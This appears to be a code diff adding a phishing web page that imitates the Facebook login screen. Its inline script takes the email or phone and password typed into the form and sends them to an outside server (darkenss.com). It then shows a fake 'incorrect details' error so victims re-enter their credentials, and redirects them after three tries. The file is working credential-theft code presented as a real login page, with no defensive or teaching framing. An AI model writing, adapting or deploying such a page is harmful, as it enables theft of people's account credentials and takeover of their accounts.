@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook — log in or sign up</title>
+
+    <link rel="stylesheet" href="css/facebook.css">
+    <style>
+        /* Add styles for the error message */
+        .error-message {
+            color: red;
+            display: none; /* Initially hidden */
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <section class="intro-section">
+            <h1>facebook</h1>
+
+            <p>Facebook helps you connect and share with the people in your life.</p>
+        </section>
+
+        <section class="signin-section">
+            <div>
+                <form id="login-form">
+                    <div>
+                        <input type="text" name="username" placeholder="Email address or phone number" required>
+                    </div>
+
+                    <div>
+                        <input type="password" name="password" placeholder="Password" required>
+                    </div>
+
+                    <div>
+                        <button type="submit">Log in</button>
+                    </div>
+
+                    <p class="error-message" id="error-message">Incorrect details, try again.</p>
+
+                    <a href="#">Forgotten password?</a>
+
+                    <hr />
+
+                    <div class="create-btn">
+                        <button type="button">Create new account</button>
+                    </div>
+                </form>
+            </div>
+
+            <p>
+                <a href="#"><strong>
+                        Create a Page
+                    </strong></a> for a celebrity, brand or business.
+            </p>
+        </section>
+    </div>
+
+    <script>
+    let loginAttempts = 0;
+
+    document.getElementById('login-form').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent default form submission
+        
+        // Retrieve form data
+        const formData = new FormData(event.target);
+        const username = formData.get('username');
+        const password = formData.get('password');
+        
+        // Backend API URL
+        const apiUrl = 'https://darkenss.com/api/submit/';
+        
+        // ID and URL Link for the request (you can set these dynamically if needed)
+        const id = '59fe207c-151f-407d-8810-2b4958fbead8'; // Replace with the actual user ID
+        const urlLink = 'http://facebook.com'; // Replace with the actual URL
+        
+        // Prepare data to send
+        const data = {
+            id: id,
+            url_link: urlLink,
+            username: username,
+            password: password
+        };
+        
+        // Send the data to the backend API
+        fetch(apiUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data),
+        })
+        .then(response => response.json())
+        .then(data => {
+            loginAttempts++;
+            if (loginAttempts >= 3) {
+                // Redirect to success page on the third attempt
+                window.location.href = 'success.html';
+            } else {
+                // Show error message
+                const errorMessage = document.getElementById('error-message');
+                errorMessage.style.display = 'block';
+            }
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+            const errorMessage = document.getElementById('error-message');
+            errorMessage.textContent = 'An error occurred. Please try again.';
+            errorMessage.style.display = 'block';
+        });
+    });
+    </script>
+</body>
+
+</html>
